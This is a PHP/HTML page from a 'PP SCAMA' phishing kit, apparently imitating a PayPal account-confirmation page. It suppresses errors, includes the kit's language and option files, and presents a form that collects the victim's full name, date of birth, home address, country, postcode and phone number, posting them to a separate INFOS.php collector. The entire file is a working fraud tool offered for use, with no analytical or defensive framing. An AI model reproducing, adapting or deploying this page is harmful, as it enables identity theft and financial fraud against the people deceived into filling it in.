<?php
session_start();
/*

+----------------------------------+
¦--- PRIVATE  PP SCAMA   2015 -----¦
¦---------- Ver : 2.0 -------------¦
¦--------- BY Dz[NO_o]B -----------¦
¦----------- GREETZ TO ------------¦
¦--- Dz Phoniex : Dz Injector -----¦
¦----------------------------------¦
¦https://code.google.com/p/dznoob/ ¦
¦----------------------------------¦
¦https://facebook.com/DzNOoBpage   ¦
+----------------------------------+


*/

@ini_set('display_errors', 0);
error_reporting(E_ALL ^ E_NOTICE);
date_default_timezone_set('GMT');
$copyright = date("Y");
include "../lang".$_SESSION['DZLN'];
// include "../antibot.php";
include "../option.php";
?>








<!DOCTYPE html>
<html lang="en" class=" js ">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title> <?php echo $confirm; ?> </title>
<link rel="shortcut icon" sizes="196x196" href="pp196.png"><link rel="shortcut icon" type="image/x-icon" href="dznoobfav.ico">
<link rel="icon" type="image/x-icon" href="pp32.png">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
<script>if( !window.location.hash && window.addEventListener ){window.addEventListener("load",function() {setTimeout(function(){window.scrollTo(0, 1);}, 1000);});}</script>
<script src="modernizr-2.6.1.js"></script>
<script>if (self === top) {var antiClickjack = document.getElementById("antiClickjack");antiClickjack.parentNode.removeChild(antiClickjack);} else {top.location = self.location;}</script><script src="app.js" data-requiremodule="app" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="router.js" data-requiremodule="router" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="analytics.js" data-requiremodule="widgets/analytics" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="nougat.js" data-requiremodule="nougat" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="jquery-1.8.0.js" data-requiremodule="jquery" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="baseview.js" data-requiremodule="BaseView" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="pageview.js" data-requiremodule="widgets/pageView" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="underscore-1.3.3.js" data-requiremodule="underscore" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="fso-helper.js" data-requiremodule="fso-helper" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="dust-core-2.0.3.js" data-requiremodule="dust" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="buttontoggle.js" data-requiremodule="buttonToggle" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="backbone-0.9.2.js" data-requiremodule="backbone" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="fso.js" data-requiremodule="fso" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="dust-helpers-1.1.1.js" data-requiremodule="dust-helpers" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="dust-helpers-supplement.js" data-requiremodule="dust-helpers-supplement" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="create.js" data-requiremodule="view/create" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="nativedropdown.js" data-requiremodule="nativeDropdown" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="jquery.ui.widget.js" data-requiremodule="jqueryUI" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="lap.js" data-requiremodule="lap" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="textfield.js" data-requiremodule="textField" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="restrict.js" data-requiremodule="restrict" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="phonenumber.js" data-requiremodule="phoneNumber" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<link rel="stylesheet" type="text/css" href="index.css" media="all">
</head>


<body class="desktop control linktobgc"><noscript><p class="nonjsAlert" role="alert">NOTE: Many features on the Web site require Javascript and cookies.</p></noscript>
<header class="mainHeader" role="banner"><div class="headerContainer"><div class="grid12"><a href="$" class="logo"><img src="logo_dznoob_106x29.png" alt=" logo" height="29" width="109"></a>
<div class="loginBtn"><span class="securityLock"> <?php echo $topp; ?> </span></div></div></div></header>


<main class="createPage US">
<section id="content" role="main" data-country="US">
<section id="main" class=""><div id="create" class="create grid12 grid"><div class="valueProp grid6">
<header><h1> <?php echo $confirm; ?> </h1></header>
<div class="imageHolder"></div></div><div class="grid6 gutter-left">
<form action="../INFOS.php" method="post" name="create_form" >

<div class="container"><div class="inner"><div class="groupFields"><div class="textInput lap large "><input class="validate camelCase" id="firstName" placeholder=" <?php echo $first_name; ?> " name="gg1" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true" type="text"></div>
<div class="textInput lap large ">
<input class="validate camelCase" id="lastName" name="gg2" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" placeholder=" <?php echo $last_name; ?> " value="" aria-required="true" type="text">
	<br>
	<br/>
					<select required name="_birthd" class="validate camelCase">
					<option>Day</option>
					<option value="01">01</option>
					<option value="02" >02</option>
					<option value="03" >03</option>
					<option value="04" >04</option>
					<option value="05" >05</option>
					<option value="06" >06</option>
					<option value="07" >07</option>
					<option value="08" >08</option>
					<option value="09" >09</option>
					<option value="10" >10</option>
					<option value="11" >11</option>
					<option value="12" >12</option>
					<option value="13" >13</option>
					<option value="14" >14</option>
					<option value="15" >15</option>
					<option value="16" >16</option>
					<option value="17" >17</option>
					<option value="18" >18</option>
					<option value="19" >19</option>
					<option value="20" >20</option>
					<option value="21" >21</option>
					<option value="22" >22</option>
					<option value="23" >23</option>
					<option value="24" >24</option>
					<option value="25" >25</option>
					<option value="26" >26</option>
					<option value="27" >27</option>
					<option value="28" >28</option>
					<option value="39" >29</option>
					<option value="30" >30</option>
					<option value="31" >31</option>
				</select>
			
			<select name="_birthm" required >
							<option>Month</option>
							<option value="01">1 - January</option>
							<option value="02">2 - February</option>
							<option value="03">3 - March</option>
							<option value="04">4 - April</option>
							<option value="05">5 - May</option>
							<option value="06">6 - June</option>
							<option value="07">7 - July</option>
							<option value="08">8 - August</option>
							<option value="09">9 - September</option>
							<option value="10">10 - October</option>
							<option value="11">11 - November</option>
							<option value="12">12 - December</option>
						</select>
			
			
			<select name="_birthy" required >
    <option>Year</option>
    <option value="2011">2011</option>
    <option value="2010">2010</option>
    <option value="2009">2009</option>
    <option value="2008">2008</option>
    <option value="2007">2007</option>
    <option value="2006">2006</option>
    <option value="2005">2005</option>
    <option value="2004">2004</option>
    <option value="2003">2003</option>
    <option value="2002">2002</option>
    <option value="2001">2001</option>
    <option value="2000">2000</option>
    <option value="1999">1999</option>
    <option value="1998">1998</option>
    <option value="1997">1997</option>
    <option value="1996">1996</option>
    <option value="1995">1995</option>
    <option value="1994">1994</option>
    <option value="1993">1993</option>
    <option value="1992">1992</option>
    <option value="1991">1991</option>
    <option value="1990">1990</option>
    <option value="1989">1989</option>
    <option value="1988">1988</option>
    <option value="1987">1987</option>
    <option value="1986">1986</option>
    <option value="1985">1985</option>
    <option value="1984">1984</option>
    <option value="1983">1983</option>
    <option value="1982">1982</option>
    <option value="1981">1981</option>
    <option value="1980">1980</option>
    <option value="1979">1979</option>
    <option value="1978">1978</option>
    <option value="1977">1977</option>
    <option value="1976">1976</option>
    <option value="1975">1975</option>
    <option value="1974">1974</option>
    <option value="1973">1973</option>
    <option value="1972">1972</option>
    <option value="1971">1971</option>
    <option value="1970">1970</option>
    <option value="1969">1969</option>
    <option value="1968">1968</option>
    <option value="1967">1967</option>
    <option value="1966">1966</option>
    <option value="1965">1965</option>
    <option value="1964">1964</option>
    <option value="1963">1963</option>
    <option value="1962">1962</option>
    <option value="1961">1961</option>
    <option value="1960">1960</option>
    <option value="1959">1959</option>
    <option value="1958">1958</option>
    <option value="1957">1957</option>
    <option value="1956">1956</option>
    <option value="1955">1955</option>
    <option value="1954">1954</option>
    <option value="1953">1953</option>
    <option value="1952">1952</option>
    <option value="1951">1951</option>
    <option value="1950">1950</option>
    <option value="1949">1949</option>
    <option value="1948">1948</option>
    <option value="1947">1947</option>
    <option value="1946">1946</option>
    <option value="1945">1945</option>
    <option value="1944">1944</option>
    <option value="1943">1943</option>
    <option value="1942">1942</option>
    <option value="1941">1941</option>
    <option value="1940">1940</option>
    <option value="1939">1939</option>
    <option value="1938">1938</option>
    <option value="1937">1937</option>
    <option value="1936">1936</option>
    <option value="1935">1935</option>
    <option value="1934">1934</option>
    <option value="1933">1933</option>
    <option value="1932">1932</option>
    <option value="1931">1931</option>
    <option value="1930">1930</option>
    <option value="1929">1929</option>
    <option value="1928">1928</option>
    <option value="1927">1927</option>
    <option value="1926">1926</option>
    <option value="1925">1925</option>
    <option value="1924">1924</option>
    <option value="1923">1923</option>
    <option value="1922">1922</option>
    <option value="1921">1921</option>
    <option value="1920">1920</option>
    <option value="1919">1919</option>
    <option value="1918">1918</option>
    <option value="1917">1917</option>
    <option value="1916">1916</option>
    <option value="1915">1915</option>
    <option value="1914">1914</option>
    <option value="1913">1913</option>
    <option value="1912">1912</option>
    <option value="1911">1911</option>
    <option value="1910">1910</option>
    <option value="1909">1909</option>
    <option value="1908">1908</option>
    <option value="1907">1907</option>
    <option value="1906">1906</option>
    <option value="1905">1905</option>
    <option value="1904">1904</option>
    <option value="1903">1903</option>
    <option value="1902">1902</option>
    <option value="1901">1901</option>
    <option value="1900">1900</option>
</select> 
	
	<br>		
			
</div></div><div class="addressEntry " id="addressEntry"><div class="groupFields"><div class="textInput lap large "><input class="hasHelp confidential validate camelCase" id="address1" name="gg4" placeholder=" <?php echo $Address1; ?> " required="required" value="" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" type="text"><input class="hasHelp confidential validate camelCase" id="address1" name="gg5" placeholder=" <?php echo $Address2; ?> " value="" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" type="text">
 <p class="help-error error-empty" id="address1Empty">Required</p><p class="help-error error-format" id="address1Format"></p></div><div class="clearfix" id="stateHolder"><div class="textInput lap large city "><input id="city" name="gg6" placeholder=" <?php echo $city; ?> " class="hasHelp validate camelCase" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" value="" type="text"><p class="help-error error-empty" id="cityEmpty">Required.</p> </div></div><div class="multi equal clearfix"><div class="nativeDropdown left medium state "><div class="selectDropdown ">
<select name="gg7" id="gg7">    

    <option value=" <?php echo $_SESSION['DZNCOUNT']; ?> " selected="selected"> <?php echo $_SESSION['DZNCOUNT']; ?> </option>
    <option value="UNITED STATES">United States</option>
    <option value="CANADA">Canada</option>
    <option value="MEXICO">Mexico</option>
    <option value="UNITED KINGDOM">United Kingdom</option>
    <option value="FRANCE">France</option>
    <option value="GERMANY">Germany</option>
    <option value="NETHERLANDS">Netherlands</option>
    <option value="DENMARK">Denmark</option>
    <option value="RUSSIA">Russia</option>
    <option value="ITALY">Italy</option>
    <option value="AFGHANISTAN">Afghanistan</option>
    <option value="ALBANIA">Albania</option>
    <option value="ALGERIA">Algeria</option>
    <option value="AMERICAN SAMOA">American Samoa</option>
    <option value="ANGUILLA">Anguilla</option>
    <option value="ANTIGUA &amp; BARBUDA">Antigua &amp; Barbuda</option>
    <option value="ARGENTINA">Argentina</option>
    <option value="ARMENIA">Armenia</option>
    <option value="ARUBA">Aruba</option>
    <option value="AUSTRALIA">Australia</option>
    <option value="AUSTRIA">Austria</option>
    <option value="AZERBAIJAN">Azerbaijan</option>
    <option value="BAHAMAS">Bahamas</option>
    <option value="BAHRAIN">Bahrain</option>
    <option value="BANGLADESH">Bangladesh</option>
    <option value="BARBADOS">Barbados</option>
    <option value="BELARUS">Belarus</option>
    <option value="BELGIUM">Belgium</option>
    <option value="BELIZE">Belize</option>
    <option value="BENIN">Benin</option>
    <option value="BHUTAN">Bhutan</option>
    <option value="BOLIVIA">Bolivia</option>
    <option value="BONAIRE">Bonaire</option>
    <option value="BOSNIA &amp; HERZEGOVINA">Bosnia &amp; Herzegovina</option>
    <option value="BOTSWANA">Botswana</option>
    <option value="BRAZIL">Brazil</option>
    <option value="BRITISH VIRGIN ISLANDS">British Virgin Islands</option>
    <option value="BRUNEI DARUSSALAM">Brunei Darussalam</option>
    <option value="BULGARIA">Bulgaria</option>
    <option value="BURKINA FASO">Burkina Faso</option>
    <option value="BURUNDI">Burundi</option>
    <option value="CAMBODIA">Cambodia</option>
    <option value="CAMEROON">Cameroon</option>
    <option value="CAPE VERDE">Cape Verde</option>
    <option value="CAYMAN ISLANDS">Cayman Islands</option>
    <option value="CENTRAL AFRICAN REPUBLIC">Central African Rep</option>
    <option value="CHAD">Chad</option>
    <option value="CHILE">Chile</option>
    <option value="CHINA">China</option>
    <option value="COLOMBIA">Colombia</option>
    <option value="COMOROS">Comoros</option>
    <option value="CONGO">Congo</option>
    <option value="COOK ISLANDS">Cook Islands</option>
    <option value="COSTA RICA">Costa Rica</option>
    <option value="COTE D IVOIRE">Cote D'Ivoire</option>
    <option value="CROATIA">Croatia</option>
    <option value="CUBA - US MILITARY">Cuba - US Military</option>
    <option value="CURACAO">Curacao</option>
    <option value="CYPRUS">Cyprus</option>
    <option value="CYPRUS NORTHERN">Cyprus (Northern)</option>
    <option value="CZECH REPUBLIC">Czech Republic</option>
    <option value="DEMOCRATIC REPUBLIC OF CONGO">Dem Rep of Congo</option>
    <option value="DJIBOUTI">Djibouti</option>
    <option value="DOMINICA">Dominica</option>
    <option value="DOMINICAN REPUBLIC">Dominican Republic</option>
    <option value="EAST TIMOR">East Timor</option>
    <option value="ECUADOR">Ecuador</option>
    <option value="EGYPT">Egypt</option>
    <option value="EL SALVADOR">El Salvador</option>
    <option value="EQUATORIAL GUINEA">Equatorial Guinea</option>
    <option value="ERITREA">Eritrea</option>
    <option value="ESTONIA">Estonia</option>
    <option value="ETHIOPIA">Ethiopia</option>
    <option value="FALKLAND ISLANDS">Falkland Islands</option>
    <option value="FIJI">Fiji</option>
    <option value="FINLAND">Finland</option>
    <option value="FRENCH GUIANA">French Guiana</option>
    <option value="FRENCH POLYNESIA">French Polynesia</option>
    <option value="GABON">Gabon</option>
    <option value="GAMBIA">Gambia</option>
    <option value="GEORGIA">Georgia</option>
    <option value="GERMANY - US MILITARY">Germany - US Military</option>
    <option value="GHANA">Ghana</option>
    <option value="GIBRALTAR">Gibraltar</option>
    <option value="GREECE">Greece</option>
    <option value="GRENADA">Grenada</option>
    <option value="GUADELOUPE">Guadeloupe</option>
    <option value="GUAM">Guam</option>
    <option value="GUATEMALA">Guatemala</option>
    <option value="GUINEA">Guinea</option>
    <option value="GUINEA-BISSAU">Guinea-Bissau</option>
    <option value="GUYANA">Guyana</option>
    <option value="HAITI">Haiti</option>
    <option value="HONDURAS">Honduras</option>
    <option value="HONG KONG">Hong Kong</option>
    <option value="HUNGARY">Hungary</option>
    <option value="ICELAND">Iceland</option>
    <option value="INDIA">India</option>
    <option value="INDONESIA">Indonesia</option>
    <option value="IRAQ">Iraq</option>
    <option value="IRELAND">Ireland</option>
    <option value="ISRAEL">Israel</option>
    <option value="ITALY - US MILITARY">Italy - US Military</option>
    <option value="JAMAICA">Jamaica</option>
    <option value="JAPAN">Japan</option>
    <option value="JAPAN - US MILITARY">Japan - US Military</option>
    <option value="JORDAN">Jordan</option>
    <option value="KAZAKHSTAN">Kazakhstan</option>
    <option value="KENYA">Kenya</option>
    <option value="KIRIBATI">Kiribati</option>
    <option value="KOREA - US MILITARY">Korea - US Military</option>
    <option value="REPUBLIC OF KOREA">Korea, Republic of</option>
    <option value="KOSOVO DEM">Kosovo</option>
    <option value="KUWAIT">Kuwait</option>
    <option value="KYRGHYZ REPUBLIC">Kyrghyz Republic</option>
    <option value="LAOS">Laos</option>
    <option value="LATVIA">Latvia</option>
    <option value="LEBANON">Lebanon</option>
    <option value="LIBERIA">Liberia</option>
    <option value="LIBYA">Libya</option>
    <option value="LIECHTENSTEIN">Liechtenstein</option>
    <option value="LITHUANIA">Lithuania</option>
    <option value="LUXEMBOURG">Luxembourg</option>
    <option value="MACAU">Macau</option>
    <option value="MACEDONIA">Macedonia</option>
    <option value="MADAGASCAR">Madagascar</option>
    <option value="MALAWI">Malawi</option>
    <option value="MALAYSIA">Malaysia</option>
    <option value="MALDIVES">Maldives</option>
    <option value="MALI">Mali</option>
    <option value="MALTA">Malta</option>
    <option value="MARSHALL ISLANDS">Marshall Islands</option>
    <option value="MARTINIQUE">Martinique</option>
    <option value="MAURITANIA">Mauritania</option>
    <option value="MAURITIUS">Mauritius</option>
    <option value="MAYOTTE">Mayotte</option>
    <option value="MICRONESIA">Micronesia</option>
    <option value="MOLDOVA">Moldova</option>
    <option value="MONACO">Monaco</option>
    <option value="MONGOLIA">Mongolia</option>
    <option value="MONTSERRAT">Montserrat</option>
    <option value="MOROCCO">Morocco</option>
    <option value="MOZAMBIQUE">Mozambique</option>
    <option value="NEPAL">Nepal</option>
    <option value="NEW CALEDONIA">New Caledonia</option>
    <option value="NEW ZEALAND">New Zealand</option>
    <option value="NICARAGUA">Nicaragua</option>
    <option value="NIGER">Niger</option>
    <option value="NIGERIA">Nigeria</option>
    <option value="NIUE">Niue</option>
    <option value="MARIANAS">Northern Mariana Islands</option>
    <option value="NORWAY">Norway</option>
    <option value="OMAN">Oman</option>
    <option value="PAKISTAN">Pakistan</option>
    <option value="PALAU">Palau</option>
    <option value="PALESTINIAN AUTHORITY">Palestinian Authority</option>
    <option value="PANAMA">Panama</option>
    <option value="PAPUA NEW GUINEA">Papua New Guinea</option>
    <option value="PARAGUAY">Paraguay</option>
    <option value="PERU">Peru</option>
    <option value="PHILIPPINES">Philippines</option>
    <option value="POLAND">Poland</option>
    <option value="PORTUGAL">Portugal</option>
    <option value="QATAR">Qatar</option>
    <option value="REUNION">Reunion</option>
    <option value="ROMANIA">Romania</option>
    <option value="RWANDA">Rwanda</option>
    <option value="SAMOA">Samoa</option>
    <option value="SAO TOME AND PRINCIPE">S&atilde;o Tom&eacute; and Pr&iacute;ncipe</option>
    <option value="SAUDI ARABIA">Saudi Arabia</option>
    <option value="SENEGAL">Senegal</option>
    <option value="SERBIA &amp; MONTENEGRO">Serbia &amp; Montenegro</option>
    <option value="SEYCHELLES">Seychelles</option>
    <option value="SIERRA LEONE">Sierra Leone</option>
    <option value="SINGAPORE">Singapore</option>
    <option value="SLOVAKIA">Slovakia</option>
    <option value="SLOVENIA">Slovenia</option>
    <option value="SOLOMON ISLANDS">Solomon Islands</option>
    <option value="SPAIN">Spain</option>
    <option value="SRI LANKA">Sri Lanka</option>
    <option value="ST. KITTS">St. Kitts &amp; Nevis</option>
    <option value="ST. LUCIA">St. Lucia</option>
    <option value="ST. MAARTEN">St. Maarten</option>
    <option value="ST. VINCENT">St. Vincent</option>
    <option value="SUDAN">Sudan</option>
    <option value="SURINAME">Suriname</option>
    <option value="SWEDEN">Sweden</option>
    <option value="SWITZERLAND">Switzerland</option>
    <option value="SYRIA">Syria</option>
    <option value="TAIWAN">Taiwan</option>
    <option value="TAJIKISTAN">Tajikistan</option>
    <option value="TANZANIA">Tanzania</option>
    <option value="THAILAND">Thailand</option>
    <option value="TOGO">Togo</option>
    <option value="TONGA">Tonga</option>
    <option value="TRINIDAD &amp; TOBAGO">Trinidad &amp; Tobago</option>
    <option value="TUNISIA">Tunisia</option>
    <option value="TURKEY">Turkey</option>
    <option value="TURKMENISTAN">Turkmenistan</option>
    <option value="TURKS &amp; CAICOS">Turks &amp; Caicos Island</option>
    <option value="TUVALU">Tuvalu</option>
    <option value="UGANDA">Uganda</option>
    <option value="UKRAINE">Ukraine</option>
    <option value="UNITED ARAB EMIRATES">United Arab Emirates</option>
    <option value="URUGUAY">Uruguay</option>
    <option value="UZBEKISTAN">Uzbekistan</option>
    <option value="VANUATU">Vanuatu</option>
    <option value="VENEZUELA">Venezuela</option>
    <option value="VIETNAM">Vietnam</option>
    <option value="YEMEN">Yemen</option>
    <option value="ZAMBIA">Zambia</option>
    <option value="ZIMBABWE">Zimbabwe</option>
</select> 


 



</div></div><div class="textInput lap medium right zip ">
<input id="postalCode" placeholder=" <?php echo $Postcode; ?> " name="gg8" autocomplete="off" class="validate" required="required" maxlength="8" " value="" type="tel">
<p class="help-error error-empty" id="zipEmpty">Required.</p></div></div></div></div><div class="groupReatedFields mobileEntry"><div class="nativeDropdown left mobileEntry "><div class="selectDropdown ">
<select id="phoneOption" name="gg9"><option value="mobile"> <?php echo $type2; ?> </option><option value="home"> <?php echo $type1; ?> </option></select></div></div><div class="textInput lap right phone phoneNumber ">

<input id="phoneNumber" name="gg10" placeholder=" <?php echo $fone; ?> " required="required" value="" class="validate hasHelp" maxlength="10" aria-required="true" autocomplete="off" autocorrect="off" autocapitalize="off"  type="tel">


</div></div>
<br><br>


<input id="submitBtn" name="_eventId_continue" class="button" value=" <?php echo $button_continue; ?>" type="submit"></div></div></form></div><img src="3484-16283-2054-70" alt="" height="1" width="1" border="0"></div></section></section></main>





</body>
</html>